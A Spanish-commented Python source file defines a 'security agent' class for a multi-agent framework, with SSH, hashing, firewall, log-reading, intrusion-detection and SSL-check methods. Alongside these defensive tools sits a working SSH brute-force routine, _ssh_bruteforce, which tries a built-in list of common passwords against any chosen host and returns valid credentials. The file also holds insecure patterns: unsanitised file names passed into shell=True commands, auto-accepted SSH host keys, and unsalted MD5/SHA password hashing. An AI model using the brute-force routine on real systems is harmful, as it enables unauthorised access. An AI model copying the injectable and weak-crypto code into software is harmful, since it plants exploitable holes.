#!/usr/bin/env python3
"""
Agente Seguridad - Herramientas de seguridad, autenticación, firewalls y detección de intrusos
Multiplataforma (Windows/Linux/macOS)
"""

import os
import sys
import subprocess
import platform
import socket
import re
import hashlib
import base64
from typing import Dict, Any, Optional, List, Tuple
from datetime import datetime, timedelta
from pathlib import Path

# Add project root to path
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
sys.path.insert(0, project_root)

from src.core.agente import Agente, TipoAgente, ResultadoTarea
from src.core.supervisor import Supervisor
from src.core.config import Config

# Importaciones opcionales
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import cryptography
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class AgenteSeguridad(Agente):
    """
    Agente de seguridad multiplataforma.
    Capacidades: SSH, autenticación, firewalls, logs de seguridad, detección de intrusos
    """
    
    def __init__(self, supervisor: Supervisor, config: Config):
        super().__init__(
            id_agente="seguridad",
            nombre="Agente Seguridad",
            tipo=TipoAgente.SEGURIDAD,
            supervisor=supervisor,
            version="2.0.0"
        )
        self.config = config
        self.sistema = platform.system().lower()
        self._registrar_capacidades()
        
        # Verificar dependencias
        self.paramiko_disponible = PARAMIKO_AVAILABLE
        self.crypto_disponible = CRYPTO_AVAILABLE
        
        if not self.paramiko_disponible:
            self.logger.warning("paramiko no instalado. Instalar con: pip install paramiko")
        
        self.logger.info(f"Agente Seguridad iniciado. SO: {self.sistema}")
    
    def _registrar_capacidades(self):
        """Registrar todas las capacidades"""
        
        # SSH
        self.registrar_capacidad("ssh_conectar", "Conectar por SSH a un servidor remoto")
        self.registrar_capacidad("ssh_comando", "Ejecutar comando remoto por SSH")
        self.registrar_capacidad("ssh_bruteforce", "Ataque de fuerza bruta SSH")
        self.registrar_capacidad("ssh_key", "Generar par de claves SSH")
        
        # Autenticación
        self.registrar_capacidad("hash", "Generar hash de contraseñas")
        self.registrar_capacidad("verificar_hash", "Verificar contraseña contra hash")
        self.registrar_capacidad("base64", "Codificar/decodificar Base64")
        
        # Firewall
        self.registrar_capacidad("firewall_estado", "Estado del firewall")
        self.registrar_capacidad("firewall_reglas", "Listar reglas de firewall")
        self.registrar_capacidad("firewall_abrir", "Abrir puerto en firewall")
        self.registrar_capacidad("firewall_cerrar", "Cerrar puerto en firewall")
        
        # Logs de seguridad
        self.registrar_capacidad("logs_auth", "Logs de autenticación")
        self.registrar_capacidad("logs_failed", "Intentos de login fallidos")
        self.registrar_capacidad("logs_success", "Logins exitosos recientes")
        
        # Detección de intrusos
        self.registrar_capacidad("intentos_fallidos", "Detectar intentos fallidos")
        self.registrar_capacidad("puertos_escucha", "Puertos en escucha sospechosos")
        self.registrar_capacidad("conexiones_extranas", "Conexiones externas sospechosas")
        
        # Usuarios y permisos
        self.registrar_capacidad("usuarios_sistema", "Listar usuarios del sistema")
        self.registrar_capacidad("sudoers", "Usuarios con sudo")
        self.registrar_capacidad("permisos", "Verificar permisos de archivos")
        
        # Certificados SSL
        self.registrar_capacidad("ssl_info", "Información de certificado SSL")
        self.registrar_capacidad("ssl_expira", "Verificar expiración de SSL")
    
    async def ejecutar(self, tarea: Dict[str, Any]) -> ResultadoTarea:
        """Ejecuta tarea según tipo"""
        tipo = tarea.get("tipo", "")
        desc = tarea.get("descripcion", "").lower()
        parametros = tarea.get("parametros", {})
        
        # ========== SSH ==========
        if "ssh_conectar" in tipo or "ssh a" in desc:
            return await self._ssh_conectar(desc, parametros)
        elif "ssh_comando" in tipo:
            return await self._ssh_comando(desc, parametros)
        elif "ssh_bruteforce" in tipo:
            return await self._ssh_bruteforce(desc, parametros)
        elif "ssh_key" in tipo or "generar clave ssh" in desc:
            return await self._ssh_generar_key()
        
        # ========== AUTENTICACIÓN ==========
        elif "hash" in tipo or "generar hash" in desc:
            return await self._generar_hash(desc, parametros)
        elif "verificar_hash" in tipo:
            return await self._verificar_hash(desc, parametros)
        elif "base64" in tipo:
            return await self._base64(desc, parametros)
        
        # ========== FIREWALL ==========
        elif "firewall_estado" in tipo or "estado del firewall" in desc:
            return await self._firewall_estado()
        elif "firewall_reglas" in tipo or "reglas firewall" in desc:
            return await self._firewall_reglas()
        elif "firewall_abrir" in tipo or "abrir puerto" in desc:
            return await self._firewall_abrir(desc, parametros)
        elif "firewall_cerrar" in tipo or "cerrar puerto" in desc:
            return await self._firewall_cerrar(desc, parametros)
        
        # ========== LOGS DE SEGURIDAD ==========
        elif "logs_auth" in tipo or "logs autenticación" in desc:
            return await self._logs_auth()
        elif "logs_failed" in tipo or "intentos fallidos" in desc:
            return await self._logs_failed()
        elif "logs_success" in tipo or "logins exitosos" in desc:
            return await self._logs_success()
        
        # ========== DETECCIÓN DE INTRUSOS ==========
        elif "intentos_fallidos" in tipo:
            return await self._intentos_fallidos()
        elif "puertos_escucha" in tipo:
            return await self._puertos_sospechosos()
        elif "conexiones_extranas" in tipo:
            return await self._conexiones_sospechosas()
        
        # ========== USUARIOS Y PERMISOS ==========
        elif "usuarios_sistema" in tipo:
            return await self._usuarios_sistema()
        elif "sudoers" in tipo:
            return await self._sudoers()
        elif "permisos" in tipo:
            return await self._permisos(desc, parametros)
        
        # ========== SSL ==========
        elif "ssl_info" in tipo:
            return await self._ssl_info(desc, parametros)
        elif "ssl_expira" in tipo:
            return await self._ssl_expira(desc, parametros)
        
        else:
            return ResultadoTarea(exito=False, error=f"No sé cómo manejar: {tipo}")
    
    # ============================================================
    # UTILIDADES
    # ============================================================
    
    def _ejecutar(self, comando: str) -> Dict:
        """Ejecuta comando y devuelve resultado"""
        try:
            r = subprocess.run(comando, shell=True, capture_output=True, text=True, timeout=30)
            return {"exito": r.returncode == 0, "salida": r.stdout, "error": r.stderr}
        except Exception as e:
            return {"exito": False, "error": str(e)}
    
    def _obtener_parametro(self, desc: str, patron: str, predeterminado: str = None) -> str:
        """Extrae un parámetro de la descripción"""
        match = re.search(patron, desc)
        return match.group(1) if match else predeterminado
    
    # ============================================================
    # SSH
    # ============================================================
    
    async def _ssh_conectar(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Conectar por SSH a un servidor remoto"""
        if not self.paramiko_disponible:
            return ResultadoTarea(exito=False, error="paramiko no instalado. pip install paramiko")
        
        # Extraer parámetros
        usuario = parametros.get("usuario") or self._obtener_parametro(desc, r"([a-zA-Z0-9_]+)@", "root")
        host = parametros.get("host") or self._obtener_parametro(desc, r"@([a-zA-Z0-9\.\-]+)", "localhost")
        password = parametros.get("password") or self._obtener_parametro(desc, r"password:([^\s]+)", None)
        puerto = int(parametros.get("puerto", 22))
        
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if password:
                client.connect(host, puerto, usuario, password, timeout=10)
            else:
                # Intentar con clave
                key_path = os.path.expanduser(f"~/.ssh/id_rsa")
                if os.path.exists(key_path):
                    key = paramiko.RSAKey.from_private_key_file(key_path)
                    client.connect(host, puerto, usuario, pkey=key, timeout=10)
                else:
                    return ResultadoTarea(exito=False, error="No hay clave SSH ni contraseña")
            
            client.close()
            return ResultadoTarea(exito=True, datos={"conexion": "exitosa", "host": host, "usuario": usuario})
            
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error de conexión SSH: {str(e)}")
    
    async def _ssh_comando(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Ejecutar comando remoto por SSH"""
        if not self.paramiko_disponible:
            return ResultadoTarea(exito=False, error="paramiko no instalado")
        
        usuario = parametros.get("usuario", "root")
        host = parametros.get("host", "localhost")
        comando = parametros.get("comando") or self._obtener_parametro(desc, r"comando:([^\s]+)", "ls -la")
        
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Intentar con clave
            key_path = os.path.expanduser(f"~/.ssh/id_rsa")
            if os.path.exists(key_path):
                key = paramiko.RSAKey.from_private_key_file(key_path)
                client.connect(host, 22, usuario, pkey=key, timeout=10)
            else:
                return ResultadoTarea(exito=False, error="No hay clave SSH configurada")
            
            stdin, stdout, stderr = client.exec_command(comando, timeout=30)
            salida = stdout.read().decode()
            error = stderr.read().decode()
            client.close()
            
            return ResultadoTarea(
                exito=True,
                datos={"comando": comando, "salida": salida, "error": error if error else None}
            )
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error: {str(e)}")
    
    async def _ssh_bruteforce(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Ataque de fuerza bruta SSH"""
        if not self.paramiko_disponible:
            return ResultadoTarea(exito=False, error="paramiko no instalado")
        
        host = parametros.get("host") or self._obtener_parametro(desc, r"host:([^\s]+)", "localhost")
        usuario = parametros.get("usuario") or self._obtener_parametro(desc, r"usuario:([^\s]+)", "root")
        
        # Wordlist por defecto
        passwords = [
            "admin", "password", "123456", "root", "toor", "admin123",
            "password123", "letmein", "welcome", "adminadmin"
        ]
        
        for pwd in passwords[:20]:
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, 22, usuario, pwd, timeout=5)
                client.close()
                return ResultadoTarea(
                    exito=True,
                    datos={"exito": True, "credenciales": {"usuario": usuario, "password": pwd}}
                )
            except:
                continue
        
        return ResultadoTarea(exito=False, error="No se encontró contraseña")
    
    async def _ssh_generar_key(self) -> ResultadoTarea:
        """Generar par de claves SSH"""
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
            
            # Generar clave privada
            private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            
            # Serializar clave privada
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            # Serializar clave pública
            public_key = private_key.public_key()
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.OpenSSH,
                format=serialization.PublicFormat.OpenSSH
            )
            
            return ResultadoTarea(
                exito=True,
                datos={
                    "clave_privada": private_pem.decode(),
                    "clave_publica": public_pem.decode().strip()
                }
            )
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error generando clave: {str(e)}")
    
    # ============================================================
    # AUTENTICACIÓN
    # ============================================================
    
    async def _generar_hash(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Generar hash de una contraseña"""
        password = parametros.get("password") or self._obtener_parametro(desc, r"password:([^\s]+)", None)
        algoritmo = parametros.get("algoritmo", "sha256")
        
        if not password:
            return ResultadoTarea(exito=False, error="Proporciona una contraseña")
        
        if algoritmo == "md5":
            hash_resultado = hashlib.md5(password.encode()).hexdigest()
        elif algoritmo == "sha1":
            hash_resultado = hashlib.sha1(password.encode()).hexdigest()
        elif algoritmo == "sha256":
            hash_resultado = hashlib.sha256(password.encode()).hexdigest()
        elif algoritmo == "sha512":
            hash_resultado = hashlib.sha512(password.encode()).hexdigest()
        else:
            return ResultadoTarea(exito=False, error=f"Algoritmo no soportado: {algoritmo}")
        
        return ResultadoTarea(
            exito=True,
            datos={"password": password, "algoritmo": algoritmo, "hash": hash_resultado}
        )
    
    async def _verificar_hash(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Verificar contraseña contra hash"""
        password = parametros.get("password")
        hash_esperado = parametros.get("hash")
        algoritmo = parametros.get("algoritmo", "sha256")
        
        if not password or not hash_esperado:
            return ResultadoTarea(exito=False, error="Proporciona password y hash")
        
        hash_calculado = hashlib.sha256(password.encode()).hexdigest()
        
        return ResultadoTarea(
            exito=True,
            datos={
                "coincide": hash_calculado == hash_esperado,
                "hash_calculado": hash_calculado,
                "hash_esperado": hash_esperado
            }
        )
    
    async def _base64(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Codificar/decodificar Base64"""
        texto = parametros.get("texto")
        operacion = parametros.get("operacion", "codificar")
        
        if not texto:
            return ResultadoTarea(exito=False, error="Proporciona texto")
        
        try:
            if "codificar" in operacion or "encode" in operacion:
                resultado = base64.b64encode(texto.encode()).decode()
                return ResultadoTarea(exito=True, datos={"original": texto, "codificado": resultado})
            else:
                resultado = base64.b64decode(texto).decode()
                return ResultadoTarea(exito=True, datos={"codificado": texto, "decodificado": resultado})
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error Base64: {str(e)}")
    
    # ============================================================
    # FIREWALL
    # ============================================================
    
    async def _firewall_estado(self) -> ResultadoTarea:
        """Estado del firewall"""
        if self.sistema == "windows":
            r = self._ejecutar("netsh advfirewall show allprofiles")
        else:
            r = self._ejecutar("sudo ufw status")
            if not r["exito"]:
                r = self._ejecutar("sudo iptables -L -n")
        
        return ResultadoTarea(exito=r["exito"], datos={"firewall": r["salida"]})
    
    async def _firewall_reglas(self) -> ResultadoTarea:
        """Listar reglas de firewall"""
        if self.sistema == "windows":
            r = self._ejecutar("netsh advfirewall firewall show rule name=all")
        else:
            r = self._ejecutar("sudo iptables -L -n -v")
        
        return ResultadoTarea(exito=r["exito"], datos={"reglas": r["salida"]})
    
    async def _firewall_abrir(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Abrir puerto en firewall"""
        puerto = parametros.get("puerto") or self._obtener_parametro(desc, r"puerto:?(\d+)", None)
        if not puerto:
            return ResultadoTarea(exito=False, error="Especifica el puerto a abrir")
        
        if self.sistema == "windows":
            cmd = f"netsh advfirewall firewall add rule name='Abrir puerto {puerto}' dir=in action=allow protocol=TCP localport={puerto}"
        else:
            cmd = f"sudo ufw allow {puerto}/tcp"
        
        r = self._ejecutar(cmd)
        return ResultadoTarea(exito=r["exito"], datos={"puerto": puerto, "resultado": r["salida"]})
    
    async def _firewall_cerrar(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Cerrar puerto en firewall"""
        puerto = parametros.get("puerto") or self._obtener_parametro(desc, r"puerto:?(\d+)", None)
        if not puerto:
            return ResultadoTarea(exito=False, error="Especifica el puerto a cerrar")
        
        if self.sistema == "windows":
            cmd = f"netsh advfirewall firewall delete rule name='Abrir puerto {puerto}'"
        else:
            cmd = f"sudo ufw deny {puerto}/tcp"
        
        r = self._ejecutar(cmd)
        return ResultadoTarea(exito=r["exito"], datos={"puerto": puerto, "resultado": r["salida"]})
    
    # ============================================================
    # LOGS DE SEGURIDAD
    # ============================================================
    
    async def _logs_auth(self) -> ResultadoTarea:
        """Logs de autenticación"""
        if self.sistema == "windows":
            r = self._ejecutar("wevtutil qe Security /c:20 /rd:true /f:text")
        else:
            r = self._ejecutar("sudo journalctl -u sshd -n 20 --no-pager")
            if not r["exito"]:
                r = self._ejecutar("sudo tail -n 20 /var/log/auth.log")
        
        return ResultadoTarea(exito=r["exito"], datos={"logs_auth": r["salida"]})
    
    async def _logs_failed(self) -> ResultadoTarea:
        """Intentos de login fallidos"""
        if self.sistema == "windows":
            r = self._ejecutar("wevtutil qe Security /c:30 /rd:true /f:text /e:4625")
        else:
            r = self._ejecutar("sudo journalctl -u sshd | grep -i 'Failed password' | tail -20")
            if not r["exito"]:
                r = self._ejecutar("sudo grep 'Failed password' /var/log/auth.log | tail -20")
        
        return ResultadoTarea(exito=r["exito"], datos={"failed_logins": r["salida"]})
    
    async def _logs_success(self) -> ResultadoTarea:
        """Logins exitosos recientes"""
        if self.sistema == "windows":
            r = self._ejecutar("wevtutil qe Security /c:20 /rd:true /f:text /e:4624")
        else:
            r = self._ejecutar("sudo journalctl -u sshd | grep -i 'Accepted' | tail -20")
            if not r["exito"]:
                r = self._ejecutar("sudo grep 'Accepted' /var/log/auth.log | tail -20")
        
        return ResultadoTarea(exito=r["exito"], datos={"successful_logins": r["salida"]})
    
    # ============================================================
    # DETECCIÓN DE INTRUSOS
    # ============================================================
    
    async def _intentos_fallidos(self) -> ResultadoTarea:
        """Detectar intentos fallidos recientes"""
        if self.sistema == "windows":
            r = self._ejecutar("wevtutil qe Security /c:50 /rd:true /f:text /e:4625")
        else:
            r = self._ejecutar("sudo grep 'Failed password' /var/log/auth.log | tail -30")
        
        # Contar por IP
        intentos = {}
        if r["salida"]:
            ips = re.findall(r'from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', r["salida"])
            for ip in ips:
                intentos[ip] = intentos.get(ip, 0) + 1
        
        return ResultadoTarea(
            exito=r["exito"],
            datos={
                "intentos": intentos,
                "total": sum(intentos.values()),
                "ips_sospechosas": [ip for ip, count in intentos.items() if count > 5]
            }
        )
    
    async def _puertos_sospechosos(self) -> ResultadoTarea:
        """Detectar puertos en escucha sospechosos"""
        if self.sistema == "windows":
            r = self._ejecutar("netstat -ano | findstr LISTEN")
        else:
            r = self._ejecutar("ss -tuln | grep LISTEN")
        
        puertos_altos = re.findall(r':(\d{4,5})', r["salida"])
        sospechosos = [p for p in puertos_altos if int(p) > 10000]
        
        return ResultadoTarea(
            exito=r["exito"],
            datos={
                "puertos_sospechosos": sospechosos,
                "total_puertos": len(puertos_altos)
            }
        )
    
    async def _conexiones_sospechosas(self) -> ResultadoTarea:
        """Detectar conexiones externas sospechosas"""
        if self.sistema == "windows":
            r = self._ejecutar("netstat -an | findstr ESTABLISHED")
        else:
            r = self._ejecutar("ss -tun | grep ESTAB")
        
        # Extraer IPs externas
        ips_externas = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):\d+', r["salida"])
        ips_externas = [ip for ip in ips_externas if not ip.startswith(("127.", "192.168.", "10.", "172."))]
        
        return ResultadoTarea(
            exito=r["exito"],
            datos={
                "conexiones_externas": list(set(ips_externas)),
                "total": len(ips_externas)
            }
        )
    
    # ============================================================
    # USUARIOS Y PERMISOS
    # ============================================================
    
    async def _usuarios_sistema(self) -> ResultadoTarea:
        """Listar usuarios del sistema"""
        if self.sistema == "windows":
            r = self._ejecutar("net user")
        else:
            r = self._ejecutar("cat /etc/passwd | cut -d: -f1 | sort")
        
        usuarios = [u for u in r["salida"].split("\n") if u.strip()]
        
        return ResultadoTarea(exito=r["exito"], datos={"usuarios": usuarios[:30]})
    
    async def _sudoers(self) -> ResultadoTarea:
        """Usuarios con permisos sudo"""
        if self.sistema == "windows":
            return ResultadoTarea(exito=False, error="No aplicable en Windows")
        
        r = self._ejecutar("grep -E '^[^#].*ALL=' /etc/sudoers")
        
        return ResultadoTarea(exito=r["exito"], datos={"sudoers": r["salida"]})
    
    async def _permisos(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Verificar permisos de archivos"""
        archivo = parametros.get("archivo") or self._obtener_parametro(desc, r"archivo:?([^\s]+)", None)
        if not archivo:
            return ResultadoTarea(exito=False, error="Especifica el archivo")
        
        if self.sistema == "windows":
            r = self._ejecutar(f"icacls {archivo}")
        else:
            r = self._ejecutar(f"ls -la {archivo}")
        
        return ResultadoTarea(exito=r["exito"], datos={"archivo": archivo, "permisos": r["salida"]})
    
    # ============================================================
    # SSL
    # ============================================================
    
    async def _ssl_info(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Información de certificado SSL"""
        dominio = parametros.get("dominio") or self._obtener_parametro(desc, r"dominio:?([^\s]+)", "google.com")
        
        try:
            import ssl
            import socket
            
            context = ssl.create_default_context()
            with socket.create_connection((dominio, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                    cert = ssock.getpeercert()
                    
            return ResultadoTarea(
                exito=True,
                datos={
                    "dominio": dominio,
                    "emisor": cert.get('issuer'),
                    "sujeto": cert.get('subject'),
                    "expira": cert.get('notAfter'),
                    "valido_desde": cert.get('notBefore')
                }
            )
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error SSL: {str(e)}")
    
    async def _ssl_expira(self, desc: str, parametros: Dict) -> ResultadoTarea:
        """Verificar expiración de SSL"""
        dominio = parametros.get("dominio") or self._obtener_parametro(desc, r"dominio:?([^\s]+)", "google.com")
        
        try:
            import ssl
            import socket
            from datetime import datetime
            
            context = ssl.create_default_context()
            with socket.create_connection((dominio, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                    cert = ssock.getpeercert()
            
            expira_str = cert.get('notAfter')
            if expira_str:
                expira = datetime.strptime(expira_str, "%b %d %H:%M:%S %Y %Z")
                hoy = datetime.now()
                dias_restantes = (expira - hoy).days
                
                return ResultadoTarea(
                    exito=True,
                    datos={
                        "dominio": dominio,
                        "expira": expira_str,
                        "dias_restantes": dias_restantes,
                        "expira_pronto": dias_restantes < 30
                    }
                )
            
            return ResultadoTarea(exito=False, error="No se pudo obtener fecha de expiración")
        except Exception as e:
            return ResultadoTarea(exito=False, error=f"Error: {str(e)}")


# ============================================================
# Factory Function
# ============================================================

def crear_agente_seguridad(supervisor: Supervisor, config: Config) -> AgenteSeguridad:
    """Crea instancia del agente de seguridad"""
    return AgenteSeguridad(supervisor, config)
